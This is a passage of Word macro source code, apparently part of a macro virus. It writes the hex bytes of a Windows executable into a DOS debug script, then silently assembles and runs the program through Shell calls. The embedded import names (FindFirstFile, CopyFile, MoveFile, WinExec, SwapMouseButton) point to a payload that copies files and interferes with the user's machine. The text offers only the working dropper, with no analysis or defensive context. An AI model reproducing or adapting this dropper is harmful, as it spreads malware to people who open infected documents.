"e 0c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f00 3c 30 00 00 00 00 00 00 00 00 00 00 bc 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f10 7c 30 00 00 70 30 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f20 c9 30 00 00 b0 30 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f30 00 00 00 00 00 00 00 00 00 00 00 00 d4 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f40 e2 30 00 00 f6 30 00 00 06 31 00 00 18 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f50 2a 31 00 00 36 31 00 00 46 31 00 00 5e 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f60 6a 31 00 00 82 31 00 00 8c 31 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f70 a2 31 00 00 b4 31 00 00 00 00 00 00 d4 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f80 e2 30 00 00 f6 30 00 00 06 31 00 00 18 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f90 2a 31 00 00 36 31 00 00 46 31 00 00 5e 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fa0 6a 31 00 00 82 31 00 00 8c 31 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fb0 a2 31 00 00 b4 31 00 00 00 00 00 00 4b 45 52 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fc0 45 4c 33 32 2e 64 6c 6c 00 55 53 45 52 33 32 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fd0 64 6c 6c 00 00 00 45 78 69 74 50 72 6f 63 65 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fe0 73 00 00 00 47 65 74 4d 6f 64 75 6c 65 48 61 6e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ff0 64 6c 65 41 00 00 00 00 46 69 6e 64 4e 65 78 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1000 46 69 6c 65 41 00 00 00 47 65 74 43 6f 6d 6d 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1010 6e 64 4c 69 6e 65 41 00 00 00 46 69 6e 64 46 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1020 72 73 74 46 69 6c 65 41 00 00 00 00 43 6f 70 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1030 46 69 6c 65 41 00 00 00 47 65 74 53 79 73 74 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1040 6d 54 69 6d 65 00 00 00 47 65 74 57 69 6e 64 6f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1050 77 73 44 69 72 65 63 74 6f 72 79 41 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1060 4d 6f 76 65 46 69 6c 65 41 00 00 00 53 65 74 43 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1070 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1080 00 00 00 00 57 69 6e 45 78 65 63 00 00 00 47 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1090 74 4d 6f 64 75 6c 65 46 69 6c 65 4e 61 6d 65 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10a0 00 00 00 00 53 77 61 70 4d 6f 75 73 65 42 75 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10b0 74 6f 6e 00 00 00 4d 65 73 73 61 67 65 42 6f 78 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10c0 41 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1100 00 10 00 00 54 00 00 00 0d 30 22 30 2c 30 37 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1110 46 30 56 30 6a 30 71 30 7c 30 85 30 8f 30 94 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1120 a9 30 ba 30 bf 30 ce 30 e6 30 02 31 0d 31 23 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1130 30 31 44 31 58 31 7a 36 80 36 86 36 8c 36 92 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1140 98 36 9e 36 a4 36 aa 36 b0 36 b6 36 bc 36 c2 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1150 c8 36 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"RCX" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"1200" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"W" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"Q" + _
Chr(34) + T$
WordBasic.Insert "Close #1" + T$
WordBasic.Insert "Shell " + Chr(34) + "debug < c:\myscript.scr > nul" + _
Chr(34) + T$
WordBasic.Insert "Shell " + Chr(34) + "c:\myscript.exe > nul" + _
Chr(34) + T$

End Sub

